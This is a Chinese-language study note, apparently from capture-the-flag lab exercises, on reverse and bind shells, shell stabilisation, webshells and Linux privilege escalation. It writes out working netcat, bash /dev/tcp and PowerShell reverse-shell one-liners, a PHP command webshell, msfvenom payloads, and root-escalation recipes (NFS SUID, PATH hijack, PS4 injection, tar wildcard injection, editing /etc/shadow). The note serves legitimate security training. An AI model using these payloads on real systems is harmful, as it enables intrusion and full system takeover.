这为会话准备了处理程序。  ”命令查看可用选项，   通过“ options 结果如下： 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231115215651451.png" alt="image-20231115215651451" style="zoom:67%;" />

插入HANDLER

我们设置了三个选项：payload 、LHOST 和 LPORT  。 这些都与我们在使用 Msfvenom 生成 shellcode 时设置的选项相同 - 特定于我们的目标的有效负载，以及可以接收 shell 的监听地址和端口。必须在此处指定 LHOST，因为 Metasploit 不会侦听所有网络接口（如 netcat 或 socat） - 必须告知它要侦听的特定地址。 

设置选项后，我们可以通过“exploit -j”运行它
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231115215934396.png" alt="image-20231115215934396" style="zoom:50%;" />

插入exploited 

当上一个任务中生成的暂存有效负载运行时，Metasploit 接收连接，发送有效负载的其余部分并为我们提供反向 shell。 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231115220105922.png" alt="image-20231115220105922" style="zoom:50%;" />





### Shell 类型 

我们对两种 shell 感兴趣—— 反向 shell 和 绑定 shell  。 

反向 shell 是指目标被迫执行连接回我们的代码。在我们的本地计算机上，您可以使用上面提到的工具来设置一个 侦听器来检索连接。 反向 shell 是绕过防火墙规则的好方法，这些规则可能会阻止您连接到目标上的任意端口。但是，缺点是当通过互联网从计算机接收 shell 时，您需要配置自己的网络以接受 shell。 

绑定 shell 是指在目标上执行的代码用于启动附加到直接在目标上的 shell 的侦听器。然后，这将向互联网开放，这意味着您可以连接到代码已打开的端口。这样做的优点是不需要在您自己的网络上进行任何配置，但可能会被保护目标的防火墙阻止。 

**反向 Shell 示例** 

很多时候， 反向 shell 就是您所需要的——尤其是在 CTF 挑战中。在下图中，左侧有一个反向 shell 监听器（接收连接的），右侧是发送反向 shell 的模拟。实际上，这更有可能通过远程网站上的代码注入或类似的方式来完成。 想象一下左侧的图像是您的本地计算机，右侧的图像是目标。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231115182134450.png" alt="image-20231115182134450" style="zoom:50%;" />

运行右侧的命令后，监听器会收到连接。当运行 whoami 命令时，我们看到我们正在以目标用户身份执行命令。 需要注意的重要一点是，我们正在本地计算机上监听并从目标发送连接。

**绑定 Shell 示例** 

绑定 shell 不太常见。再一次，左边的图像是我们的机器，右边是模拟目标。首先，我们在目标上启动一个侦听器 - 并告诉它执行 cmd.exe  。然后，随着侦听器的运行，我们从本地计算机连接到新打开的端口。这再次让我们在远程计算机上执行代码 - 目标正在侦听并且我们连接到它。  

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231115182431292.png" alt="image-20231115182431292" style="zoom:50%;" />



**shell 可以是交互式的 ，也可以是非交互式的**

交互式 shell 类似于 PowerShell  、BASH  、ZSH  、SH 或任何其他标准 CLI 环境。它们允许您在执行程序后与程序进行交互 - 例如 SSH 登录 。 

非交互式 shell 没有那么奢侈。在非交互式 shell 中，您只能使用不需要用户交互才能正常运行的程序。不幸的是，大多数简单的反向和绑定shell都是非交互式的。





### Netcat Shell 稳定

正如所讨论的，  netcat  shell 非常不稳定 。按 CTRL+C 一次会杀死整个 shell。它们也是非交互式的 ，并且经常出现奇怪的格式错误。这是因为 netcat“shell”实际上是在终端内运行的进程，而不是其本身的真正终端。Windows 反向 shell 的稳定往往要困难得多；然而，第二种技术对其特别有用。 

技术 1 - Python 

第一种技术仅适用于Linux，因为它们几乎总是默认安装 Python。这是一个 3 阶段的过程： 

    首先是使用 python -c 'import pty;pty.spawn("/bin/bash")' 它使用Python生成功能更好的 bash shell。某些目标可能需要指定Python版本。如果是这种情况，只需将“python”替换为“python3”或“python2”根据需要即可。此时，shell看起来会更漂亮，但制表符自动完成或箭头键仍然无法使用 。 
    第二步是使用“export TERM=xterm”，它使我们可以访问术语命令，例如“clear” 
    最后，我们使用“CTRL+Z”将shell背景化。然后，回到我们自己的终端，我们使用“stty raw -echo; fg”，它执行两件事 - 它关闭我们自己的终端回显，然后将shell置于前台，完成该过程。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231115185538017.png" alt="image-20231115185538017" style="zoom:67%;" />

如果 shell 在此过程中死亡，您自己的终端中的任何输入都将不可见。要修复它，请输入“  reset  ”并按 Enter 键。 

技术 2 - rlwrap 

Rlwrap 是一个程序，它使我们能够在收到 shell 后立即访问历史记录、制表符自动完成和箭头键。但是，如果您想在 shell 中使用 CTRL+C（例如停止程序），仍然必须使用一些手动稳定功能。z要安装它，请使用“ sudo apt install rlwrap  ”命令。 

要使用 rlwrap，我们调用不同的侦听器： 

rlwrap nc -lvnp [端口] 

在 netcat 前面加上“  rlwrap  ”可以提供功能更齐全的 shell。这种技术在处理众所周知难以稳定的 Windows shell 时特别有用。 

当处理 Linux 目标时，可以通过使用与之前相同的技巧来完全稳定, stty raw -echo;  fg。

技术3-socat 

稳定 shell 的第三种简单方法是使用初始的 netcat shell 作为进入更好的 socat shell 的垫脚石。请记住，此技术仅限于 Linux，因为 Windows 上的 Socat shell 具有相同的稳定性。

为了实现这种稳定方法，我们首先将 socat 静态编译的二进制文件传输到目标机器。典型的方法是使用“python3 -m http.server 80”在本地计算机上使用网络服务器，然后使用curl或wget将文件下载到目标计算机上（wget [IP]/socat -O /tmp/socat） 

在 Windows CLI 环境中，可以使用 PowerShell 完成相同的操作，使用 Invoke-WebRequest 或 webrequest 系统类 ，具体取决于 PowerShell 版本 - "  Invoke-WebRequest -uri [IP}/socat.exe -outfile C:\\Windows \temp\socat.exe  " 

对于上述任何一项，更改终端 tty 大小都很有用。在反向或绑定shell中，如果您想使用文本编辑器之类的东西来覆盖屏幕上的所有内容，则必须手动完成。 

首先，打开另一个终端并运行“stty -a” - 这将为您提供大量输出。记下行和列的值
rowscols.png

接下来，在 shell 中输入： 

stty 行 [数量] 

stty 列 [数量] 





### 常见 Shell 有效负载

之前的任务提到我们将研究一些使用 netcat 作为绑定 shell 侦听器的方法。 在某些版本的 netcat 中，有一个“  -e  ”选项，允许您在连接上执行进程。 例如： 

nc -lvnp [端口] -e /bin/bash 

使用 netcat 连接到上述侦听器将导致目标上有一个绑定 shell。同样，对于反向 shell，使用“  nc [localIP] [port] -e /bin/bash  ”连接回会导致目标上出现反向 shell。 

然而， 大多数版本的 netcat 中都不包含此功能，因为人们普遍认为它不安全。在 Windows 上，几乎总是需要静态二进制文件，这种技术将完美地发挥作用。 在 Linux 上，我们将使用以下代码为绑定 shell 创建侦听器： 

mkfifo /tmp/f;  nc -lvnp <端口> < /tmp/f |  /bin/sh >/tmp/f 2>&1;  rm /tmp/f 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231115205650713.png" alt="image-20231115205650713" style="zoom:67%;" />

可以使用一个非常相似的命令来发送 netcat 反向 shell： 

mkfifo /tmp/f;  nc <本地IP> <端口> < /tmp/f |  /bin/sh >/tmp/f 2>&1;  rm /tmp/f 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231115205732045.png" alt="image-20231115205732045" style="zoom:67%;" />

除了使用 netcat 连接语法而不是监听语法之外，该命令实际上与前一个命令相同。 

当针对现代 Windows Server 时，需要 PowerShell 反向 shell 是很常见的，因此我们将介绍标准的单行 PSH 反向 shell。 

这个命令非常复杂。为了简单起见，不再直接解释。 然而，这是一条非常有用的单行文字，值得保留： 

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0.. 65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding) .GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" 

为了使用它，我们需要 替换 <IP>  和 <port> 用适当的 IP 和端口选择。  然后可以将其复制到 cmd.exe shell 中并执行 - 产生反向 shell。 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231115205943746.png" alt="image-20231115205943746" style="zoom:67%;" />





### WebShell 

有时我们会遇到允许我们上传可执行文件的网站。理想情况下，我们会使用它来上传激活反向或绑定 shell 的代码，但有时这是不可能的。在这些情况下，我们会上传一个 webshell。 Webshell 是一个通俗术语，指的是在 Web 服务器内运行并在服务器上执行代码的脚本。本质上，命令通过 HTML 形式或直接作为 URL 参数输入到网页中，然后由脚本执行，结果返回并写入页面。

由于 PHP 仍然是最常见的服务器端脚本语言，因此 PHP 的一个非常基本的行是： 

<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>

这需要 URL 中的 GET 参数并使用“shell_exec()”在系统上执行它。本质上，这意味着我们在 URL 中“?cmd=”之后输入的任何命令都将在系统上执行。 “pre”元素用于确保结果在页面上的格式正确。
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231115220636127.png" alt="image-20231115220636127" style="zoom: 50%;" />

请注意，当导航到 shell 时，我们使用了 GET 参数“  cmd  ”和命令“  ifconfig  ”，它正确返回了盒子的网络信息。换句话说，通过在我们的 shell 的 URL 中输入 ifconfig 命令，它就在系统上执行了。 

默认情况下，Kali 上有多种可用的 webshell，位于“  /usr/share/webshells  ” - 包括 PentestMonkey 的 php-reverse-shell（https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php），它是用 PHP 编写的完整反向 shell。 

当目标是 Windows 时，通常最容易使用 Web shell 获取 RCE，或者使用 msfvenom 以服务器语言生成反向/绑定 shell。对于前者，获取 RCE 通常是通过 URL 编码的 PowerShell 反向 shell 来完成的。然后，这将作为“cmd”参数复制到 URL 中。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231115220943493.png" alt="image-20231115220943493" style="zoom:67%;" /> 

这与之前的 shell 相同，但它经过 URL 编码，以便在 GET 参数中安全使用。 









## 权限提升

### 常见的Linux提权

权限升级Privilege Escalation 通常涉及从较低权限到较高权限。从技术上讲，它是利用操作系统或应用程序中的漏洞、设计缺陷或配置监督来获取对通常限制用户访问的资源的未经授权的访问。 

在进行 CTF 或实际渗透测试时，您很少能获得提供管理员访问权限的立足点。 权限升级可让您获得系统管理员级别的访问权限，从而允许您执行更多操作： 

    重置密码 
    绕过访问控制以危害受保护的数据 
    编辑软件配置 
    启用持久性 
    更改其他用户的权限 



#### 权限提升的方向

有两种主要的特权升级变体： 水平horizontal 和 垂直vertical 。 
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231115231523116.png" alt="image-20231115231523116" style="zoom:33%;" />

**水平权限提升**

水平权限是指您通过接管与您具有相同权限级别的其他用户来扩大对受感染系统的影响范围。例如，一个普通用户劫持另一个普通用户，这允许您继承用户拥有的任何文件和访问权限。这可用于获取对另一个普通特权用户的访问权限，该用户恰好在其主目录中附加了 SUID 文件，然后可以使用该文件来获取超级用户访问权限。 

**垂直权限提升** 

垂直privesc是您尝试使用已被盗用的现有帐户获得更高权限或访问权限的地方。 对于本地垂直攻击，这可能意味着劫持具有管理员或根权限的帐户。



#### 枚举

LinEnum 是一个 BASH 脚本，它执行与权限升级相关的常见命令 - 从长远来看可以节省时间。了解它执行哪些命令非常重要，这样当您无法使用 LInEnum 或其他脚本时，您就可以手动枚举 privesc。 

在目标机器上获取 LinEnum 有两种主要方法。第一种方法是使用语法“python3 -m http.server 8000”在包含 LinEnum 的目录中托管 Python3 Web 服务器。托管后，您可以在目标计算机上使用“wget”命令来获取文件并使用语法“wget [IP]:8000/LinEnum.sh”下载它。下载后，最后一步是使文件在系统上可执行。请注意，如果您没有权限，您可能需要将文件下载到可字写入的目录中 - “/tmp”目录是一个不错的选择，因为几乎每个用户都可以访问它。

如果您无法传输文件，您还可以使用 Vi 或 Nano 等文本编辑器复制原始 LinEnum 代码并将其粘贴到目标上的新文件中。 完成后，您可以使用“.sh”扩展名保存文件，并再次向该文件添加可执行权限。 

要运行 LinEnum，您只需输入“ ./LinEnum.sh ”即可。

LinEnum 的输出分为不同的部分，有 4 个主要部分非常重要且有用。  

这些都是：

    核心Kernel
    我们可以读/写敏感文件
    SUID文件 
    定时任务内容Crontab Contents

 Kernel：正如它所暗示的那样，内核部分包含有关 Linux 内核的信息。如果目标很长时间没有更新内核，则很可能存在可用的内核漏洞。 

sensitive files：敏感文件部分显示系统上所有可写入的文件。这些是任何经过身份验证的用户都可以读取和写入的文件。查看敏感文件的权限，您可能会发现配置错误，该配置可能允许用户写入敏感文件。 

SUID files：SUID 文件显示可以以 root 身份运行的所有文件。SUID（Set User ID upon execution 执行时设置用户ID）是赋予文件的一种文件权限。它允许文件以该文件所有者的权限运行。如果所有者是 root，则它以 root 权限运行。例如，如果我们可以修改这些文件之一的内容来生成 shell，我们就可以运行它并在 root 权限下执行 shell。 

Crontabs：Crontabs 部分显示计划的作业。Cron 用于在特定时间安排命令。计划的命令称为“cron 作业”。“crontab”命令创建一个 crontab 文件，其中包含 cron 守护程序要执行的命令和指令。





#### NFS 共享配置

通过 NFS 创建的文件继承远程用户的 ID。  如果用户是 root，并且启用了 root 压缩，则 ID 将被设置为“nobody”用户。

 要检查 NFS 共享配置，请运行以下命令： 

    cat /etc/exports 

请注意，/tmp 共享已禁用 root 压缩。因此，在我们的本地计算机上，我们可以创建一个挂载点并挂载 /tmp 共享。 

    mkdir /tmp/nfs 
    
    mount -o rw,vers=2 [IP]:/tmp /tmp/nfs 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116223204720.png" alt="image-20231116223204720" style="zoom: 67%;" />

仍然在我们的本地计算机上，我们可以使用 msfvenom 生成有效负载并将其保存到已安装的共享中 - 该有效负载只需调用 /bin/bash。 

    msfvenom -p linux/x86/exec CMD=”/bin/bash -p” -f elf -o /tmp/nfs/shell.elf 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116223333287.png" alt="image-20231116223333287" style="zoom:67%;" />

最后，使文件可执行并设置 SUID 权限： 

    chmod +xs /tmp/nfs/shell.elf 

最后一步，返回目标计算机，执行该文件以获得 root shell。 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116223418665.png" alt="image-20231116223418665" style="zoom: 67%;" />





####  SUID/GUID 文件

Linux privesc 中良好的第一步是检查设置了 SUID/GUID 位的文件。这意味着可以使用文件所有者或组的权限运行一个或多个文件。 

当您为任何文件设置权限时，您应该了解您允许或限制所有三种权限的 Linux 用户。可用于为每个用户设置权限的最大位数为 7 - 读取 (4)、写入 (2) 和执行 (1) 的组合。 

当给每个用户特殊的权限时，它就变成SUID或GUID。当额外位“4”设置为用户（所有者）时，它变为 SUID，而当位“2”设置为组时，它变为 SGID。 

查找SUID时要查找的权限是： 

rws-rwx-rwx 

而查找SGID时要查找的权限是： 

rwx-rws-rwx 

如果您想手动查找 SUID 文件，可以使用带有以下参数的“find”命令： 

find /-perm -u=s -type f 2>/dev/null 

意义： 

    find  - 启动“查找”命令 
    / - 搜索整个文件系统 
    -perm  - 搜索具有特定权限的文件 
    -u=s  - 为文件设置任何权限位模式，这种形式接受符号模式。
    -type f  - 搜索文件 
    2>/dev/null  - 将错误直接发送到 /dev/null 并立即删除 



##### SUID/SGID 可执行文件 - 已知漏洞 

我们可以做的另一件有用的事情是使用带有以下参数的 find 命令搜索目标上的所有 SUID/SGID 可执行文件： 

    find / -type f -a \(-perm -u+s -o -perm -g+s \) -exec ls -l {} \;  2> /dev/null

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116213645469.png" alt="image-20231116213645469" style="zoom:50%;" />

请注意，/usr/sbin/exim-4.84-3 出现在结果中。搜索此版本的 exim 的漏洞会发现以下漏洞(https://www.exploit-db.com/exploits/39535)。
cve.png

与此版本的 exim 完全匹配的本地权限提升漏洞。已可以在 /home/user/tools/suid/exim/cve-2016-1531.sh 找到副本。 
exim.png

只需运行该漏洞即可获得 root shell。 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116213901692.png" alt="image-20231116213901692" style="zoom:50%;" />



##### SUID/SGID 可执行文件 - 共享对象注入 

/usr/local/bin/suid-so SUID 可执行文件容易受到共享对象注入的攻击。首先，执行该文件并注意它在退出之前显示一个进度条。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116214430371.png" alt="image-20231116214430371" style="zoom:50%;" /> 

在文件上运行“strace”并搜索输出中的 open/access 调用以及“no such file”错误： 

    strace /usr/local/bin/suid-so 2>&1 | grep -iE “open|access|no such file”

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116214539988.png" alt="image-20231116214539988" style="zoom:67%;" />

查看结果，可执行文件尝试加载主目录中的 /home/user/.config/libcalc.so 共享对象，但找不到。  

为了利用这一点，首先我们在主目录中创建 .config 目录，示例共享对象代码可以在 /home/user/tools/suid/libcalc.so 中找到。它只是生成一个 bash shell。 要将代码编译为 suid-so 可执行文件正在查看的位置的共享对象，请使用以下命令：

    gcc -shared -fPIC -o /home/usr/.config/libcalc.so /home/user/tools/suid/libcalc.so 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116214805999.png" alt="image-20231116214805999" style="zoom:67%;" />

编译后，再次执行 suid-so 可执行文件，请注意，这次我们得到的不是进度条，而是 root shell。 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116214839719.png" alt="image-20231116214839719" style="zoom: 50%;" />



##### SUID/SGID 可执行文件 - 环境变量 

/usr/local/bin/suid-env 可执行文件可以被利用，因为它继承了用户的 PATH 环境变量并尝试在不指定绝对路径的情况下执行程序。 

首先，执行该文件并注意它似乎正在尝试启动 apache2  Web 服务器： 

    /usr/local/bin/suid-env 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116215335166.png" alt="image-20231116215335166" style="zoom:50%;" />

在文件上运行 strings 以查找可打印字符串会显示一行 - service apache2 start。
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116215454403.png" alt="image-20231116215454403" style="zoom:50%;" />

这表明正在调用服务可执行文件来启动 Web 服务器，但未使用可执行文件的完整路径 (/usr/sbin/service)。

我们可以将位于 /home/user/tools/suid/service.c 的代码编译为名为 service 的可执行文件 - 该代码只是生成一个 Bash shell 

    gcc -o service /home/user/tools/suid/service.c

然后，我们可以将当前目录（或新服务可执行文件所在的位置）添加到 PATH 变量中，并运行 suid-env 可执行文件来获取 root shell

    PATH=.:$PATH /usr/local/bin/suid-env

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116215825092.png" alt="image-20231116215825092" style="zoom:67%;" />



##### SUID/SGID 可执行文件 - 滥用 Shell 功能 

/usr/local/bin/suid-env2 可执行文件与 /usr/local/bin/suid-env 相同，只是它使用服务可执行文件 (/usr/bin/service) 的绝对路径来启动 apache2 Web 服务器。  

首先，我们可以使用 strings 命令验证这一点。 

    strings /usr/local/bin/suid-env2

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116220017093.png" alt="image-20231116220017093" style="zoom:50%;" />

在 BASH 版本 < 4.2-048 中，可以使用类似于文件路径的名称定义 shell 函数，然后导出这些函数，以便使用它们而不是该文件路径中的任何实际可执行文件。 
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116220137829.png" alt="image-20231116220137829" style="zoom:50%;" />

为此，我们首先创建一个名为“/usr/sbin/service”的 BASH 函数，该函数执行新的 BASH shell，然后导出该函数。 

    function /usr/sbin/service { /bin/bash -p; } 
    
    export -f /usr/sbin/service

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116220248422.png" alt="image-20231116220248422" style="zoom: 67%;" />

完成后，运行 suid-env2 可执行文件以获得 root shell。 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116220319547.png" alt="image-20231116220319547" style="zoom: 67%;" />



**SUID/SGID 可执行文件 - 滥用 Shell 功能 #2** 

在开始之前，这种权限提升技术不适用于 BASH 4.4 及更高版本。在调试模式下，BASH 使用环境变量 PS4 显示调试语句的额外提示。 

在启用 BASH 调试并将 PS4 变量设置为嵌入式命令的情况下运行 /usr/local/bin/suid-env2 可执行文件，该命令创建 /bin/bash 的 SUID 版本：

    env -i SHELLOPTS=xtrace PS4=#$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)’    /usr/local/bin/suid-env2

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116220858181.png" alt="image-20231116220858181" style="zoom: 67%;" />

然后，使用“-p”运行 /tmp/rootbash 可执行文件以获得以 root 权限运行的 shell。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116220952286.png" alt="image-20231116220952286" style="zoom:67%;" /> 





#### 弱文件权限 - /etc/passwd

**弱文件权限 - 可写 /etc/passwd**

从前面的枚举问题例子中，我们看到 user7 是 GID 0 的 root 组的成员。并且从 LinEnum 中我们知道 /etc/passwd 对 user7 是可写的。由此，我们可以得出结论，user7可以编辑/etc/passwd文件。/etc/passwd 文件存储登录期间所需的基本信息。它存储各种帐户信息，例如 用户名 、用户 ID  、组 ID  、主目录 、shell 等。 

/etc/passwd 文件应具有一般读取权限，但写入权限应仅限于 root 用户。 当它没有这些权限或用户已添加到允许写入的组时，我们就有一个漏洞，可以允许创建我们可以访问的根用户。 

/etc/passwd 文件对于每个用户每行包含一个条目。 所有字段均由冒号分隔，总共有 7个字段 。 一般来说，条目如下所示： 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231115233758524.png" alt="image-20231115233758524" style="zoom:67%;" />

这些不同的字段具有以下含义： 

    用户名 ：用户登录时使用，应介于 1-32 个字符之间。 
    密码 ：“x”表示加密后的密码存储在/etc/shadow中 
    用户ID(UID)：必须为每个用户分配一个UID。UID 0 为root保留，UID 1-99 为其他预定义帐户保留。另外 UID 100-999 是系统为管理和系统帐户/组保留的 
    组ID(GID)：主要组 ID 存储在 /etc/group 文件中 
    用户ID信息 ：允许提供额外信息，例如全名、号码等。 
    主目录 ：用户主目录的绝对路径。如果不存在则变为/ 
    Command/shell  : 命令或 shell 的绝对路径 (/bin/bash) 

如果/etc/passwd可写，则可以根据上述公式写入新行条目来创建新用户。 您只需添加密码哈希，将 UID、GID 和 shell 设置为 root。





#### 弱文件权限 - /etc/shadow 

**弱文件权限 - 可读 /etc/shadow**

**/etc/shadow 文件包含用户密码哈希值**，通常只能由 root 用户读取。  在此例子里，“/etc/shadow”文件是可读的。 
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116111115177.png" alt="image-20231116111115177" style="zoom:50%;" />

要查看 /etc/shadow 的内容，只需cat即可。 
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116111247855.png" alt="image-20231116111247855" style="zoom:50%;" />

文件的每一行代表一个用户。用户的密码哈希可以在每行的第一个和第二个冒号 (:) 之间找到。

 首先，将 root 用户的哈希值保存到本地名为 hash.txt 的文件中，然后使用 John the Ripper 使用 rockyou.txt 单词列表来破解它

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116111354413.png" alt="image-20231116111354413" style="zoom:50%;" />

一旦密码被破解，只需切换到 root 用户

**弱文件权限 - 可写 /etc/shadow**

您还应该注意到 /etc/shadow 文件也是全局可写的 。 

要生成新的密码哈希以替换此文件中现有用户的密码，您可以使用“mkpasswd -m sha-512 newpassword123”命令。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116111700934.png" alt="image-20231116111700934" style="zoom:67%;" />

创建后，只需编辑 /etc/shadow 文件并将原始 root 用户的密码哈希替换为您刚刚生成的密码哈希即可。 
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116111742868.png" alt="image-20231116111742868" style="zoom:67%;" />

完成后，只需使用新密码切换到 root 用户

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116111811772.png" alt="image-20231116111811772" style="zoom:50%;" /> 





#### 利用 crontab

Cron 守护进程是一个长期运行的进程，它在特定的日期和时间执行命令。  您可以使用它来安排活动 - 作为一次性事件或重复任务。您可以创建一个 crontab 文件，其中包含供 Cron 守护程序执行的命令和指令。使用“cat /etc/crontab”命令，您可以查看计划了哪些 cron 作业。 

Cronjobs 以某种格式存在 - 如果你想利用 cron job，能够读取该格式非常重要。   cron 中使用以下符号： 

    # -ID 
    m - 分钟 
    h - 小时 
    dom - 一个月中的某天 
    mon - 月 
    dow - 一周中的某天 
    user  - 命令运行的用户 
    command - 将运行什么命令 

例如我们知道 user4 桌面上的文件 autoscript.sh 计划每 5 分钟运行一次。 它由 root 拥有，这意味着尽管我们可以编辑它，但它仍将以 root 身份运行。目标是创建一个命令，该命令将返回 shell 并将其粘贴到文件中。 然后，当再次运行时，shell 将以 root 身份运行。





#### Cron Jobs 

##### Cron Jobs - 文件权限

Cron jobs 是用户可以安排在特定时间或间隔运行的程序或脚本。 Cron 表文件 (  crontabs  ) 存储 cron jobs的配置。系统范围的 crontab 位于 /etc/crontab 。

要查看内容，只需cat即可。查看有两个计划任务每分钟运行一次。一个运行 overwrite.sh，另一个运行 /usr/local/bin/compress.sh。
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116184716931.png" alt="image-20231116184716931" style="zoom:50%;" />

要查找 overwrite.sh 的完整路径是什么，您可以运行“locate overwrite.sh”
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116193241270.png" alt="image-20231116193241270" style="zoom:50%;" />

查看每个文件的权限，可以看到overwrite.sh是全局可写的。这意味着我们可以覆盖该文件的内容，以便在下一分钟运行时生成 shell。 
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116193357640.png" alt="image-20231116193357640" style="zoom:50%;" />

为此，我们可以使用以下内容更改 overwrite.sh 文件的内容： 

    #!/bin/bash 
    bash -i >& /dev/tcp/10.11.3.112/4444 0>&1 

保存后，在本地计算机上运行 netcat 侦听器以捕获反向 shell 并等待 cron 作业运行。
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116193531957.png" alt="image-20231116193531957" style="zoom:50%;" />

一分钟或更短时间后，root shell 应该连接回您的 netcat 侦听器。 



##### **Cron Jobs - PATH 环境变量**

再次查看系统范围的 crontab 会发现 PATH 变量以 /home/user 开头，这是我们用户的主目录。 
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116200126683.png" alt="image-20231116200126683" style="zoom:50%;" />

有了这些信息，我们可以在主目录中创建一个名为 overwrite.sh 的文件，其中包含以下内容： 

    #!/bin/bash 
    cp /bin/bash /tmp/rootbash 
    chmod +xs /tmp/rootbash 

确保使 home/user/overwrite.sh 文件可执行。 
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116200606737.png" alt="image-20231116200606737" style="zoom:50%;" />

然后，等待 cron jobs 运行。运行后，尝试使用“-p”运行“/tmp/rootbash”命令以获得以 root 权限运行的 shell。 
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116200844957.png" alt="image-20231116200844957" style="zoom: 67%;" />



##### **Cron Jobs - 通配符 Wildcards**

查看其他 cron 作业脚本的内容，我们注意到 tar 命令在我们的主目录中使用通配符 (*) 运行。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116212015046.png" alt="image-20231116212015046" style="zoom:50%;" />

查看 tar 的GTFOBins(https://gtfobins.github.io/gtfobins/tar/)页面  ，我们可以看到 tar 具有命令行选项，可让您运行其他命令作为检查点功能的一部分。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116212139359.png" alt="image-20231116212139359" style="zoom:50%;" />

使用 msfvenom，我们可以生成反向 shell ELF 二进制文件。

 <img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116212251477.png" alt="image-20231116212251477" style="zoom: 67%;" />

创建后，我们可以使用 scp 或托管 Web 服务器并使用 wget 将 shell.elf 文件传输到目标计算机上的 /home/user。 一旦进入机器，您就可以授予它可执行权限。 
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116212355038.png" alt="image-20231116212355038" style="zoom:50%;" />

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116212434060.png" alt="image-20231116212434060" style="zoom: 67%;" />

然后，在/home/user中创建两个文件： 

    touch /home/user/--checkpoint=1 
    
    touch /home/user/--checkpoint-action=exec=shell.elf 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116213001725.png" alt="image-20231116213001725" style="zoom: 50%;" />

当 tar 命令通过 cron jobs 运行时，通配符 (*) 将扩展以包含这些文件。由于它们的文件名是有效的 tar 命令行选项，因此 tar 会识别它们并将它们视为命令行选项而不是文件名。 

要捕获 shell，您需要在本地计算机上设置一个 netcat 侦听器，该侦听器与 msfvenom 中指定的端口相同。一分钟后，您应该会收到一个 root shell。





#### sudo -l 查找root命令

要列出 sudo 允许运行的程序，请使用“  sudo -l  ”命令

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116112943035.png" alt="image-20231116112943035" style="zoom: 50%;" />

接下来，如果列出了程序、脚本或服务，请查看 GTFOBins（https://gtfobins.github.io/）并搜索程序名称。如果程序以“sudo”作为函数列出，您可以使用它来提升权限 - 通常通过转义序列Escape Sequences。有一个程序在 GTFOBins 上没有任何条目，即 apache2。 

